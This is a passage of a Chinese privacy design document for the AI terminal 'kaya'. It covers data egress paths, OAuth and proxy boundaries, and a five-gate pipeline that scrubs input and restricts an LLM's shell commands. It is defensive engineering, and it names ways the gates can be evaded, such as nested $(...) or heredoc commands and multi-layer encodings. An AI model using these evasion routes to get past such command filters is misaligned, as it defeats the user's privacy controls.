# kaya · Privacy First 设计

> [English version](PRIVACY.en.md)

*最后同步:2026-11-06 · 基于 kaya v3.2.10 与最新产品定位调整;实现路径与历史测试计数引用产品仓库,本公开仓库不含源代码。*

> **第一优先级是用户隐私,绝不把隐私信息报漏给 LLM。**
>
> 这是产品决策的起点,不是文档末尾的"安全提示"。所有
> 设计在写第一行代码前,先问一句:**"这条数据出去之后能不能撤回?"** 不能
> 撤回,就在出门前 redact 掉。

---

## 1. 一句话承诺

> kaya 运行在**你自己的 Mac / Windows PC** 上,LLM 只看得到你**主动给
> 它**的内容。**默认它什么文件都看不到**;你往 `~/.kaya/`
> 下放了什么、你说的话里有什么 secret,被 5 道关卡过完之后,才进
> LLM 的 context。

这是结构性的,不是配置项 — 改不了。

**产品定位与权限范围**:kaya 是**为 AI 开发者打造的 AI 终端**,在完整终端基础上提供模型管理、编程 Agent 管理、安全网关和 AI 大脑。「AI 大脑」指内置对话与受限工具协助,不代表新增本机权限;「安全网关」即本文的模型网关,可选、默认关闭,只处理明确接入的编程 Agent 模型请求,与聊天的五道关卡是独立路径。更换产品表述不改变文件读取、coding 模式、逐标签页授权或订阅边界;非核心能力也不因此变为实验性。

---

## 2. 数据流:什么出机器、什么留本地

```
你的 Mac                                                          LLM endpoint
┌──────────────────────────────────────────────┐                ┌──────────────┐
│                                              │                │              │
│  ┌──────────┐   run_shell (独立子进程)        │                │              │
│  │ 真 zsh   │ ──────────────────────► [policy]│                │              │
│  │ (用户)   │                    │           │                │              │
│  └──────────┘                    │           │                │              │
│        ▲                         ▼           │                │              │
│        │  PTY 输出                [safety]   │                │              │
│        │  (LLM 是观察者)            │           │                │              │
│        │                           ▼           │                │              │
│        │                       [exec]          │                │              │
│        │                           │           │                │              │
│        │                           ▼           │                │              │
│        │                       [scrub]          │                │              │
│        │                           │           │                │              │
│  ┌──────────┐                      │           │   已脱敏的      │              │
│  │ Chat UI  │ ◄──── LLM 响应 ─────┘           │   请求体        │              │
│  │ (前端)   │ ────────────── invoke("llm_chat") ───────────────► │              │
│  └──────────┘                                  │                │              │
│      │                                         │                │              │
│      ▼                                         │                │              │
│  localStorage (UI 状态,reasoning 不存)         │                │              │
│  ~/.kaya/                            │                │              │
│    ├─ conversations/c_*.json (LLM 上下文)        │                │              │
│    ├─ audit/s_*/events-*.jsonl (审计)            │                │              │
│    └─ debug/s_*/turn-N.json (可选, dev-only)     │                │              │
└──────────────────────────────────────────────┘
```

会离开你的机器、去往 LLM 端点的**只有三样东西**:scrub 后的用户输入、
scrub 后的工具输出、scrub 后的 LLM 请求体。**API Key 本身**只发到 LLM 的
鉴权 header,不进 body;**Prompt 内容**是 scrubbing 后的内容,不是原始输入。
另:任务队列感知(perceive / report 回合)由 kaya **自采**的 git 只读摘要
在进 prompt 前同样先截断再过 Strict scrub(不经 policy gate,实现细节见
§7.10)——归入「scrub 后的 LLM 请求体」一类,不新增出口。

**粘贴图片(2026-10-02)**:Chat 里粘贴(Cmd+V)的图片经 canvas 重编码
(剥除 EXIF/GPS 等全部元数据 + 长边降采样至 1568px)后,**只随该回合发往
你当前选用的模型**——BYOK 链路经 rig `image_base64` 多 part 直达目标
provider,不经任何第三方中转;IM 渠道与 CLI 的图片构造点恒为空,镜像/远程
不会把图片带出去。图片字节走 `ChatArgs.images` 独立字段,**不进文本
guard / scrub 管道**(高熵 base64 与 secret 形态不可区分,进 guard 会被
误 redact 再截断——这是结构性原因,见 §4.2.1);**内置模型(yunhou `/chat`
代理)契约是纯文本**,带图请求在入口一律 fail-closed(`images_unsupported_builtin:`
明确报错)——内置路径下图片**从不出机**。会话字节预算
(`message_estimated_bytes`)计入图片,防会话上限被绕过。

出口固定、可审计;除上述三样外,仅存的其余出口是:

- **使用情况统计心跳**(默认开启,设置 → 账户 可关闭):登录状态下每 5 分钟
  向 yunhou 服务器上报一次 `{active_seconds, platform, app_version, local_date, occurred_at, client_event_id}`。
  不含对话内容、文件内容、昵称、邮箱等任何 PII(身份由登录 JWT 承载);
  未登录时不上报;用于 DAU/WAU/MAU 与使用时长等运营统计。
- **云端 Token 用量上传(默认关闭、显式 opt-in,2026-10-26)**:设置 →
  「账户」→「云端 Token 用量」经用户确认后开启,同意版本为
  `kaya-usage-upload-v2`。只上传按 UTC 小时或天聚合的用量桶(source +
  agent + 归一化 provider 键 + 模型 id + token 计数 + 请求次数)与设备注册
  四字段(随机设备 id、OS 家族、kaya 版本、consent 版本);不上传对话或
  工具内容。详见 §8「云端 Token 用量上传」。
- **远程访问(relay 中转,默认关、显式 opt-in,2026-09-15)**:启用后,
  桌面对话内容 / 运行中 agent 状态 / 授权审批经 yunhou relay 服务器中转
  到你的浏览器端,远程端与桌面看到的内容一致。relay 仅内存透传:不解析
  payload、不持久化任何帧、访问日志不含 payload;全程 WSS(TLS)。
  详见 §4.8。未启用时该出口不存在,关闭即断连。
- **更新检查与一键更新(2026-10-01;2026-10-04 更新源改官网)**:「检查更新」向 kaya 官网匿名 GET
  一份版本清单(`/api/kaya/desktop/latest`,cn → yunhouai.com,intl →
  yunhou.ai;不带登录态、不含任何用户数据);macOS 上点「下载并安装」后,
  从**官网**匿名 GET `latest.json` 并下载更新包(`/downloads/kaya/`,
  cn → www.yunhouai.com,intl → yunhou.ai;minisign 验签通过后才替换本地
  .app。更新源只走官网,不经 GitHub)。两处都是只读下载,不上行
  任何内容;与 kaya 自建 HTTP 客户端同口径使用应用代理(关闭时显式直连,不读系统代理)。
- **BYOK 模型用量探测(2026-10-12,设置页重设计)**:设置 →「模型」tab
  的条目状态卡会按条目的 base_url 向**该 provider 自己**的用量接口发
  只读 GET(目前覆盖 DeepSeek `/user/balance`、Moonshot
  `/v1/users/me/balance`、SiliconFlow `/v1/user/info`、OpenRouter
  `/api/v1/credits`)。边界:API key 只进 `Authorization: Bearer` header
  (由 Rust 从 keychain 读取,不出 Rust 进程);HTTP client 显式
  应用代理感知(关闭时显式直连,不读系统代理);host 不在适配表内的 provider
  **零外发**(不发请求,状态卡显示「不提供用量查询」);探测到的金额
  只回前端展示——不进审计 JSONL、不进 debug dump、不进 LLM 上下文,
  app_log 只记 `{provider_id, status}`(不记金额;2026-10-16 供应商分层
  起探测与记录都是 provider 级);用量缓存是会话级内存态
  (TTL 5min),不落盘、不随 persist 持久化。
- **OpenCode 会话路由头(2026-10-19)**:选择 OpenCode provider 时,
  Chat / CLI 请求按 OpenCode 官方契约附带 `x-opencode-session`(由
  Kaya conversation id 经 SHA-256 派生,同一会话跨回合稳定,不包含原始
  conversation id)与 `User-Agent: kaya`;这两个头只在 OpenCode base_url
  上注入,其他 BYOK provider 不携带。无 conversation 的一次性辅助调用
  使用随机 session 值;审计 / debug dump 不记录这些请求头。
- **供应商目录(2026-10-16,模型供应商分层):构建期快照,运行时零外发**。
  设置 →「模型」tab「+ 添加供应商」的目录选择器数据来自
  `crates/kaya-core/data/provider_catalog.json`(models.dev 的蒸馏快照,
  `scripts/fetch-provider-catalog.mjs` 离线刷新、提交进 git)+ 本地手工
  覆盖层(`provider_catalog_overlay.toml`),两者**编译期内嵌**进二进制
  (`include_str!`,OnceLock 内存合并,`provider_catalog_list` 命令纯内存
  读取)——**app 运行时不向 models.dev 或任何目录来源发任何请求**;
  目录只含公开的端点 URL 与模型 id 清单,无任何凭证。
- **模型列表获取(`/models`,2026-10-17,Phase 2 上线)**:设置 →「模型」的
  详情页「刷新」会向**该 provider 自己的** `/models` 端点发起一次只读
  GET(探测协议优先级 chat → openai → anthropic;anthropic 拼
  `{base}/v1/models`,chat/openai 拼 `{base}/models`),用响应中的模型 id
  清单刷新该 provider 的模型列表(写回本机库文件)。触发面**仅用户动作**,
  四处、各一次:手动点「刷新」;保存**非空新 key** 成功后自动一次;保存
  **从未抓取过**的条目后自动一次(无需新 key);首次打开「已在库且从未
  获取」的 provider 自动一次。OAuth 条目在**未登录 / 已过期时跳过自动
  抓取**(登录成功后补一次)。**无定时器、无轮询、无 boot 全量抓取**;
  目标 host = 用户自配 provider 的 base_url,不经任何第三方中转。
  - **鉴权与边界**:api_key 只进 `Authorization: Bearer`(chat/openai;
    无 key 的本地端点如 Ollama 省略)或 `x-api-key` + `anthropic-version`
    (api_key + anthropic)鉴权 header;**OAuth access token 在所有协议一律
    `Authorization: Bearer`**。凭据由 Rust 从 keychain 读取、不出 Rust 进程;
    HTTP client 显式 应用代理感知(关闭时显式直连,不读系统代理);**禁
    redirect**(3xx 不跟随,不把 key 带到 Location host);**10 秒**整体
    超时;响应体**流式有界读取,上限 2 MiB**(超限立即中止,不等完整
    body),解析只接受 `{data:[…]}` 形状且**只抽取校验后的模型 id**
    (trim、非空、≤200 字符、无控制字符),body 其余内容不进库、不进
    日志、不进 LLM 上下文。2026-10-22 起解析前**不再过 Strict scrub**
    (scrub 的高熵兜底会把 `claude-sonnet-4-20250514` 这类带日期戳的
    正常模型 id 涂改成 `[REDACTED:entropy-string]` 落库;隐私边界由
    「只取 id、零日志零上下文」维持)。OAuth provider 用
    `resolve_bearer` 解析 access token(未登录 / 已标定过期时在**发请求前**
    fail-closed,零网络;刷新瞬态失败按既有裁决回旧 token 再试一次,由上游
    401 兜底;token 只发往该供应商自己的 base_url);anthropic 本地缺 key
    同样 fail-closed;401/403 与其余非 2xx 一律**不读 body**,只落固定错误码。
  - **失败与兜底**:网络 / HTTP / 解析失败 → **固定错误码 sentinel**
    (不含 transport 文本与 body)写进库文件的 `models_fetch_error`,下次
    「刷新」覆盖;带目录 preset 的 provider 同时把 auto 模型行回填为
    **本地目录快照**(UI 标注「目录快照,可能滞后」,manual 行不动);
    **手动维护的模型行在任何路径下都不被在线结果覆盖或删除**。
  - **日志 / 审计零 key 零 body**:该路径不新增审计事件;app_log 只记
    `{provider_id, status, error_code, fetch_error_code, model_count}`
    (online = info,其余 warn;`fetch_error_code` 仅在 fetch 失败而提交也
    失败时另存 fetch 侧码,恒为固定 sentinel);目录快照兜底**真正应用**时
    另推一条 info 事件 `model_fetch_catalog_fallback`(payload 只含
    provider_id,不含 token / 响应 body);key、响应 body、模型 id
    清单不进 app_log、不进审计 JSONL、
    不进 debug dump、不进 LLM 上下文。抓取结果只回前端展示并更新模型库
    镜像,库写入走既有 `mutate_library` 漏斗(与手动编辑同一把锁)。
- **供应商 OAuth 设备授权(2026-10-17,Phase 3;Kimi 已实现,真机验收
  待完成)**:设置 →「模型」详情页的「登录」会向 **Kimi 官方授权服务
  `https://auth.kimi.com`** 发起 device code flow(RFC 8628):
  `POST /api/oauth/device_authorization` 领取 user_code + 验证 URL,随后按
  服务端间隔 `POST /api/oauth/token` 轮询直到批准 / 拒绝 / 过期;token 临期
  或上游 401 时用 refresh_token 在同一端点轮换。上屏验证 URL 取官方参考值
  `https://www.kimi.com/code/authorize_device`(**以真机响应为准**),在
  **系统浏览器**打开由用户批准。凭据数据面精确分三类:
  - **(a) 身份元数据**:只有公共 client_id 与四个 `X-Msh-*` 头
    (`Platform: kimi_cli`、kaya 包版本、固定设备名 `kaya-desktop`、
    每 provider 随机 UUID device id);**不发 hostname、不发设备型号 /
    OS 版本指纹**。
  - **(b) 协议参数**:轮询请求带 device_code、刷新请求带 refresh_token,
    两者另含 grant_type / client_id,作为 form 参数经 TLS 发往
    `auth.kimi.com`,**不发给任何其它方**。HTTP 使用应用代理(关闭时显式直连)、
    **禁 redirect**(绝不把参数跟去第三方 host)、单次请求 10 秒超时、
    响应体有界读取(64 KiB)、轮询循环 15 分钟 deadline(interval 夹取
    1–30 秒,`slow_down` 加 5 秒)。
  - **(c) token 原文**:access / refresh token 只存系统钥匙串与 Rust
    进程内存(§8),**不向前端 / IPC / 日志 / 审计 / debug dump 暴露**;
    UI 只拿 user_code + 验证 URL + 固定错误哨兵(`oauth_poll_*` /
    `oauth_begin_failed` / `oauth_token_persist_failed` 等,零上游 body
    回显)。
  出货目录里 **Kimi Coding Plan 声明可启动的 OAuth**(device flow,UI 有
  登录入口);**Anthropic 仍只声明 API Key**(oauth 块仅留位 coming,UI 不
  渲染其 OAuth 入口)。`provider_oauth_start` 对未开放 / 不可启动项在
  Rust 侧 fail-closed(零网络)。
- **供应商 OAuth 浏览器授权(2026-10-27;OpenAI ChatGPT 订阅 / Codex
  已实现)**:设置 →「模型」详情页的「登录」对
  **OpenAI ChatGPT 订阅(Codex)** 目录条目走浏览器 Authorization Code +
  PKCE 流程,与上面的 Kimi device flow 是**两条独立 flow**(按目录声明的
  flow 分流,互不影响):
  - **(a) 授权面**:向 **Codex 官方授权服务 `https://auth.openai.com`**
    请求 `oauth/authorize`(public client `app_EMoamEEZ73f0CkXaXp7hrann`;
    scope `openid profile email offline_access api.connectors.read
    api.connectors.invoke`;额外参数 `id_token_add_organizations=true` /
    `codex_cli_simplified_flow=true` / `originator=codex_cli_rs`)。用户
    在**系统浏览器**里批准,授权码回到本机 **loopback 监听**(只绑
    `127.0.0.1`,端口只用官方登记的 1455 → 1457)。PKCE 用 S256;
    `state` 随机且**逐字校验**(失配即零 token 交换);回调最长等 15 分钟。
    等待是**循环**:只接受 `GET /auth/callback`,其余路径(favicon / 端口
    探测 / 错误路径)固定 404 后**继续等**(不得抢掉真回调);**state 先校验**
    —— 拒绝与缺 code 都不得绕过 state 闸。**失配是有界容忍的**
    (2026-10-28):loopback 端口对本机任意进程开放,「一次失配即终止」等于
    给本机任何程序一个一击打死正在进行的登录的开关;故少量失配(state 不
    匹配 / 旧会话回调 / 本机探测)只回固定失败页并继续等,连续失配达到
    上限(5 次)才 fail-closed。响应页只在 **state 通过且拿到 code** 时回
    200 成功页;失配 / 拒绝 / 缺 code 一律固定失败页 + **非 200**,零回显
    (`state` / `code` / `error_description` 都不进页面)。
  - **(b) 换 token 面**:授权码经 form(`grant_type=authorization_code` /
    `code` / `redirect_uri` / `client_id` / `code_verifier`)POST 到
    `https://auth.openai.com/oauth/token`;**refresh 同端点但用 JSON body**
    (`Content-Type: application/json`,键集 `grant_type=refresh_token` /
    `client_id` / `refresh_token`,**不带 scope** —— 与 Codex 官方一致)。
    HTTP 使用应用代理(关闭时显式直连)、**禁 redirect**、单次请求 10 秒超时、
    响应体有界读取(64 KiB)。
  - **(c) 凭据数据面**:access / refresh token 及可选 `account_id` 随包存系统
    钥匙串并用于 Rust 内存；**ID token 只在内存解析 `chatgpt_account_id`
    与 `exp`,解析完即丢弃**,绝不落盘 / 进 IPC / 进日志 / 进审计 /
    进 debug dump。授权码 / PKCE verifier / ID token **结构上不进 IPC**;
    `state` 与 `code_challenge` **只随授权 URL 的 query 上屏并交给系统浏览器**,
    没有独立 wire 字段,且不进日志 / 审计 / Debug(Debug 经 `debug_safe_url`
    去掉 query);回调 query 不记日志、不反射 `error_description`(固定 HTML 回包)。
  - **(d) 上游端点隔离**:ChatGPT 订阅的上游是
    **`https://chatgpt.com/backend-api/codex/responses`**(Codex 官方
    契约),**不是** `api.openai.com` —— 订阅 token 与 API Key 是两个产品,
    凭据绝不互发。目录里 `openai-chatgpt`(仅 OAuth)与 `openai`
    (仅 API Key)`https://api.openai.com/v1` **并存**,端点白名单在登录、
    落库、解析三处继续 fail-closed(订阅 token 只发 chatgpt.com)。
  - **(e) 账号身份头**:ChatGPT 上游要求额外的 `chatgpt-account-id` 头
    (从 ID token 的 `https://api.openai.com/auth` claims 解析)。该值随 token 包存系统 keychain，运行时作
    上游身份头在 **Rust 内存**里使用 —— **不进 IPC / 日志 / 审计 /
    debug dump**;出站前入站伪造的同名头被剥离(保留头表),模型库自定义
    头也不允许写它(防串账号)。缺账号身份 → 该路由按「无可用凭据」
    处理(fail-closed),绝不用空身份头发上游。
  - **(f) 模型清单**:ChatGPT backend **没有**本设计可依赖的 `/models`
    目录契约 —— **不猜路径**(在线发现对该条目**零网络**拒绝),模型清单走
    **编译期静态目录**(目录内嵌的 OpenAI 编码模型元数据)。
  出货目录里 **OpenAI ChatGPT 订阅(Codex)声明可启动的 OAuth**(浏览器
  flow,UI 有登录入口;oauth-only 条目实例化即默认 OAuth,认证方式选择器
  不渲染 API Key 项)。**OpenAI API Key 条目与 Anthropic 仍只声明
  API Key**。

  **支持与验证范围**:ChatGPT 订阅只服务四家编程 Agent 经网关的 Responses 适配,不供 kaya 自带 Chat 或审计 AI judge 使用。上游已完成 macOS 上 Codex 首请求、长历史续跑与全局接管裸模型验证;Kimi Coding Plan 的真机验收仍待完成,不据此推定其他平台或流程均已验证。

**全部状态都在本机**:UI 状态在 `localStorage`,LLM 上下文 / 审计 / 调试
在 `~/.kaya/`。本机状态不自动云同步;使用情况统计心跳(见上)默认开启、
可在设置中关闭,内容仅限应用存活时长 / 平台 / 版本号;经明确同意的
云端 Token 用量上传是独立 opt-in 通道。

**默认模型来源(round-138, 2026-08-04)的数据出口**:kaya 出厂默认走
**内置模型**(yunhou `/chat` 代理)—— 脱敏后的对话内容经你的登录令牌
(JWT)发往 **yunhou 第一方服务器**,由服务端持 DeepSeek key 代答。客户端
发送前按服务端限额裁剪(消息条数 / 每条字节 / 总字节上限,超限丢最早历史
—— 发送前丢内容,本身是隐私相关行为)。登录令牌(refresh_token)只存在
系统钥匙串(macOS Keychain / Windows 凭据管理器)。改用 **Ollama**(本地推理)可做到推理与对话 / 工具内容零外发;登录后的使用情况心跳与经明确同意的云端 Token 用量上传是独立通道,不受 Provider 选择影响。改用 **OpenAI 兼容**
则内容发往你自选的服务商。本机状态存储仍无中心服务器 —— 但默认数据
**出口**经 yunhou 服务器,这是 round-138 起的变化,隐私定位需明确知情。

**应用内代理(2026-10-30；2026-11-02 增加分范围与分协议路由)的网络中间方边界**:设置 → 通用 → 网络代理
一旦启用,kaya **自身**的出站请求默认全部(内置 Chat / BYOK / OpenAI
Responses / 审计 judge / OAuth / 模型目录与探活 / Tavily / usage 上报 / 官网更新清单
与 updater 下载 / 飞书 · Slack · 企微 · Remote 的 REST 与 WSS / 网关的
远端上游)先连到**你指定的代理服务器**。代理运营方因此可能看到这些
连接的目标主机、时序和 TLS 之外可见的元数据 —— 这是用户自己选择的
网络中间方,kaya 的 5 道关卡不改变这一事实,也不为其背书。边界如下:

- **不碰 Shell**:应用设置绝不写 `HTTP_PROXY` / `HTTPS_PROXY` /
  `ALL_PROXY` / `NO_PROXY` 及大小写变体,不写 shell profile,不改
  `CommandBuilder.env` / PTY 启动参数 / `run_shell` 的 env 快照。
  Terminal、PTY 里手动起的命令、LLM `run_shell` 子进程以及用户在终端中
  启动的 coding agent **完全不受影响**;要在 Terminal 里走代理,仍需
  用户自己 `export`(设置页有明示提示)。`run_shell` 子进程看到的
  proxy 变量永远来自用户自己的 Shell 快照。
- **回环恒直连**:`localhost`、`127.0.0.1`、`::1` 是内置不可移除的
  直连规则;网关本地 listener、OAuth loopback listener、健康检查一律
  不经代理,防止本地服务流量进入代理。
- **bypass 保存校验**:只接受 hostname（可带前导点）、合法 IPv4 / IPv6
  （IPv6 可带方括号）或有效 CIDR；拒绝 URL、userinfo、端口、路径、通配符、
  空条目与非法网段。reqwest 0.12 / 0.13 与 WebSocket 共用该校验,
  非法配置不能发布到代理运行态。
- **旧盘 bypass 兼容加载**:旧版本可能已把 URL、端口、路径、下划线、非
  ASCII 等非法条目写进 `proxy.json`。加载期**逐条忽略**这些条目、保留合法
  条目,绝不把非法条目解释成更宽的直连例外(被忽略的目标回到代理路径,
  方向安全);除用户显式直连范围外的所有出口不会因这一条历史遗留条目而
  整体不可用。加载不改写盘上用户配置,保存新配置仍严格拒绝非法项;
  诊断只记被忽略的**条数**,不记录任何原始内网主机名。被忽略的条数经既有
  代理配置快照(`legacy_bypass_ignored`)透出到设置页,显示零内容提示「已忽略 N
  条无法识别的直连例外,已回到代理路径」;原始条目 / 主机名绝不进 DTO、IPC、
  日志或 UI。用户显式保存按过滤后的列表整写,计数归零。
- **bypass 域名匹配**:域名条目同时匹配自身与子域；配置与目标域名有无单个根尾点
  等价。reqwest 0.12 / 0.13 同时匹配域名的有尾点和无尾点形态，与 WebSocket
  旁路一致；IP / CIDR 不增加尾点变体，未命中的域名仍按配置使用代理。
- **密码只进钥匙串**:代理密码 write-only,只存 OS keychain 内部共享键(通用 secret IPC 拒读写),
  永不写 `localStorage`、proxy.json、app_log、审计或 IPC 回显;
  设置快照对密码仅暴露存在性元数据(单端点 `has_password`,高级模式 `advanced_has_password` 三个布尔)。
  高级模式三个端点各有独立钥匙串槽位,互不复用、互不回显,并与 `proxy.json` 一样跨 variant 共享。
- **分协议端点**:默认仍是单个代理端点;开启高级模式后可同时保存 HTTP、HTTPS、SOCKS5
  三个独立端点(各自启用与认证)。每类目标优先使用专用端点;专用端点未启用时先回退
  SOCKS5,最后才借用另一类端点(HTTP 经 CONNECT 可承载 HTTPS,HTTPS 代理也可转发
  HTTP)。启用代理时至少需要一个端点,否则保存和启动均拒绝。端点缺失或连接失败都不会
  触发直连或改道回退。
- **代理应用范围**:模型、网关、账号、用量(Token 用量上传、心跳及它们自己发起的令牌刷新)、搜索、IM 渠道、
  远程访问、更新八类出口可分别选择走代理或显式直连。`direct_scopes` 只记录用户
  明确直连的范围,旧配置缺省为空(全部走代理);各业务自己发起的令牌刷新跟随
  该业务范围(模型 / 远程取票 / 用量),账号设置与后台账号刷新归账号范围;
  未选直连的范围不会因代理故障而自动改用直连。显式直连范围不读取系统代理、PAC 或进程 env;
  配置通过语义校验且启动第二份快照复核未变时,已确认的直连范围不受代理凭据不可用影响;
  配置无法解析、保存提交不确定或启动快照已变化时无法确认例外,全部范围 fail closed。
- **故障不回退直连(fail closed)**:对选择走代理的范围,配置损坏、启用认证时 keychain 读取失败或
  启动读取超时,运行态置为不可用并返回固定脱敏文案
  (`proxy unavailable: check proxy settings in the app`),**绝不**
  自动改用直连 —— 否则会出现「以为走了代理、实际明连」的隐私意外。
  连接代理失败也返回网络错误,不重试直连。只有启动配置通过语义校验、第二份快照复核未变
  且用户提前明确设为直连的范围不受代理凭据不可用影响。代理关闭时是显式直连,不读取系统代理、PAC 或进程 env;
  保留的认证草稿不触发启动keychain读取。
- **凭据事务与控制面**:`proxy.json`仅含非敏感配置;密码修改前先原子持久化
  `proxy.pending.json`(随机revision + pending,无凭据),配置提交或密码确认回滚后
  才解除pending。中断/回滚失败后启用认证会拒用现存密码,须显式重新输入;
  关闭代理可保留不确定标记并直连。`proxy.json`、`proxy.pending.json`、
  `proxy.lock`及点后缀临时/备份变体全部进入Rust/TS控制面拒写闸,可信下载和
  重定向也不能改变代理端点、密码事务或锁文件。
  Get/Set快照的`revision`只覆盖同一份公开配置与事务标记,不包含密码或
  secret hash;认证Keep在文件锁内、读取密码之前核对`expected_revision`,
  旧/缺来源拒绝并要求重载或显式新密码。来源匹配时仍允许编辑端点后空密码保留;
  旧来源的关闭/未认证Keep先落并保留pending,防止之后启用时误用另一实例的密码。
  来源不确定但已通过显式密码变更修复时,保存会清除所有其它Keep槽位(包括另一模式)后再解除pending,
  使下次启动恢复可用,同时避免以后启用端点时复用未确认密码;任何密码回滚失败均保留pending。
  最终marker即使rename已生效后才报错也将本进程置Unavailable。设置页显示磁盘
  快照,`needs_apply`按同一Ready快照携带的来源版本判定;另一实例提交或同配置
  换密码均显示待应用,保存成功直接返回新版本,失败后不宣称草稿已应用。
- **启动与设置可用性**:启动整个代理读取最多5s;元数据/保存前旧密码读取最多2s。
  OS读取为单飞,超时后不再派重复读取线程;启动等待时不持代理文件锁/保存锁,
  用户仍能关闭代理。迟到读取不能发布运行态,正常返回也须复核配置、随机
  revision和runtime generation。OS Keychain写入仍由系统授权控制,没有强制中止保证。
- **新请求即时生效**:包括工具循环后续请求、401强刷重放、429等待后重试及更新器
  check之后的download,每次实际发送前均取当前代理;已发出的响应可以继续完成。
  所有client缓存先取得缓存锁再读代理代次,同锁完成检查/构建/回填/返回,
  包括网关上游、Cloud upload、Slack、OpenAI与飞书,同步锁竞争也不会匹配旧代次。
  长期持有的OpenAI兼容provider逐stream_chat刷新transport,保留会话头。Slack的
  网络/429退避和auth.test后的连接协商都现取client。飞书自建应用的token/cache
  锁等待、取token后的消息create/PATCH、平台连续自检均重新选择出口;缓存与TTL
  保留。消息create为窄REST,不进入SDK的商店app_ticket隐式请求;10012作为业务失败。
- **不降级 TLS**:不提供「忽略证书错误」开关。当前 WebSocket 与
  reqwest 0.12 使用内嵌 webpki-roots,reqwest 0.13 使用
  rustls-platform-verifier 按平台信任校验。应用未提供额外 CA 配置;
  仅将企业 MITM / 自签代理 CA 装入 OS 信任库不能让 WebSocket / 0.12
  信任它,这些连接仍严格校验证书并拒绝不受信证书。
- **错误面脱敏**:错误文案只含协议 / 主机 / 端口 / 失败类别,不含
  密码、完整认证 URL 或 `Proxy-Authorization`;代理配置、密码与失败
  **不写** app_log / 审计 / 调试捕获(代理层没有任何日志出口)。
- **网关**:只代理**远端上游**;网关本地入口与 `/health` 无出站。

代理控制面拒写规则由Rust policy与TS replay双镜像维护;macOS/Windows比较忽略大小写,
Linux保持大小写敏感。应用代理不改变safety/scrub规则与deny前缀。

---

## 3. 5 道关卡:scrub 是兜底,policy + safety 是主防

设计哲学:**不要相信 scrub 能拦住一切**。**结构上** LLM 默认拿不到
文件内容(没有 cat、没有 less、没有 base64),**只有**用户主动放到
trusted root 下的内容才放行。Scrubber 是 regex,regex 必然有漏判 —
它的工作是"减少残留",不是"防泄漏"。

```
   用户输入 (你打字 / 粘贴的内容)
       │
       ▼
   ┌──────────────────────────────────────────┐
   │  第零关 · 用户输入 guard                  │
   │  位置: 前端 runAgent 入口 + Rust llm_chat │
   │  动作: scrub-first → truncate 32 KiB      │
   │  失败模式: scrub regex 漏判                │
   │  兜底: 「已脱敏」badge 提示                 │
   └──────────────────────────────────────────┘
       │
       ▼  (scrubbed text 已是 redact 后内容)
   ┌──────────────────────────────────────────┐
   │  第一关 · Policy gate (能力策略)           │
   │  位置: Rust run_shell stage 1            │
   │  动作: 黑名单/白名单 + 管道分段 + trusted  │
   │         read (cat ~/.kaya/*              │
   │         / head / tail / grep /           │
   │         sed -n 等)+ trusted download     │
   │         (curl -o ~/.kaya/                │
   │         <安全后缀> URL)                   │
   │         + redirect 门控(> / >> 仅当目标  │
   │         在 ~/.kaya/ 内且扩展名安全时放行, │
   │         round-68)                        │
   │  失败模式: 新加的"危险命令"没被覆盖         │
   │  兜底: 默认拒绝,LLM 收到结构化错误          │
   └──────────────────────────────────────────┘
       │
       ▼
   ┌──────────────────────────────────────────┐
   │  第二关 · Safety gate (危险命令检测)       │
   │  位置: Rust run_shell stage 2            │
   │  动作: DANGEROUS/REPL/OPERATION 正则      │
   │  失败模式: heredoc / $(...) / `...` 嵌套   │
   │  兜底: 递归扫描 depth=3 + base 正则        │
   └──────────────────────────────────────────┘
       │
       ▼  (通过的命令)
   ┌──────────────────────────────────────────┐
   │  第三关 · Execute 隔离                      │
   │  位置: Rust run_shell stage 3            │
   │  动作: zsh -f -c <cmd> (不读 .zshrc)       │
   │  设计: 与用户 PTY 完全独立                  │
   │  限制: 默认 8s 超时(用户可配,du/find/ │
   │         grep 等慢扫描命令下限 30s)+     │
   │         100KB 输出上限                  │
   └──────────────────────────────────────────┘
       │
       ▼  (执行产出)
   ┌──────────────────────────────────────────┐
   │  第四关 · Output scrub (凭据脱敏)          │
   │  位置: Rust run_shell stage 4            │
   │  动作: ~38 类 secret/PII 正则,整块 PEM    │
   │  失败模式: 多层嵌套编码(单层 base64/    │
   │         hex 已由 §7.9 重扫层覆盖)         │
   │  兜底: 用户主动开 trusted read 时仍会 scrub │
   └──────────────────────────────────────────┘
       │
       ▼  (scrubbed output)
   进 LLM context
```

**用户在 terminal 里敲的命令不经过任何门** — 那是你的 shell,你的责任。

---

## 4. 第零关:用户输入 Guard

跑在**两处** — 前端 `runAgent` 入口 + Rust `llm_chat` 入口。两次跑同一
个 pipeline,**任何一头失败都不让 raw text 出门**。

### 4.1 顺序关键:先 scrub,再 truncate

如果先 truncate 再 scrub,secret 可能**正好骑在截断边界**上,被切一
半泄漏给 LLM — 截断后的前半段就是真实 secret 的前缀。scrub-first
保证:任何被 redact 的 span 要么完整保留 (`[REDACTED:private-key]`),
要么完全消失,不会切一半。

实现:

- 前端: `src/lib/userInputGuard.ts::applyUserInputGuard`
- Rust: `crates/kaya-core/src/llm/user_input_guard.rs::apply_user_input_guard`
- CLI: `crates/kaya-cli/src/input_guard.rs::guard`

### 4.2 32 KiB 硬上限

`USER_INPUT_MAX_BYTES = 32768`(v1.2.3: 4096 → 65536 → 32768),前端和 Rust 各自
一个常量,锁在 cargo tripwire + vitest test 里。截断按 UTF-8 码点二分,
emoji / surrogate pair 不切一半。

### 4.2.1 粘贴图片不进文本 guard(2026-10-02)

粘贴图片的 base64 数据**不经过本节的用户输入 guard**:它走 `llm_chat` 的
`ChatArgs.images` 独立 wire 字段(与 `agent_target` 前缀在 scrub 后拼接同一
先例),不占 32 KiB 文本预算。base64 图片数据在形态上与高熵 secret 不可
区分,进 guard 会被误 redact 再截断,反而破坏图片;真正的防线在 Rust 入口
的 `validate_images`(`src-tauri/src/llm_commands.rs`)——逐张复验张数 ≤4、
解码后 ≤5MB、mime ∈ {png, jpeg, webp, gif}(SVG 拒绝:多数端点不支持且可
携带脚本),超限返回 `images_invalid:` sentinel,前端映射为友好提示。图片的
隐私边界由「发送对象 = 当前选用的模型」保证(见 §2),不由文本 scrub 保证。

### 4.3 全 PEM 整块 redact(2026-06-19 事故)

> 事故复盘:一个用户粘贴了完整 RSA 私钥,旧 regex 只匹配
> `-----BEGIN ... PRIVATE KEY-----` 标记行,**整段 base64 body 直接
> 走 LLM**,在 chat UI 上明文显示。

修复后,`-----BEGIN ... PRIVATE KEY-----` + body + `-----END ... PRIVATE
KEY-----` 整块匹配(非贪婪 body),整段密钥作为一整块
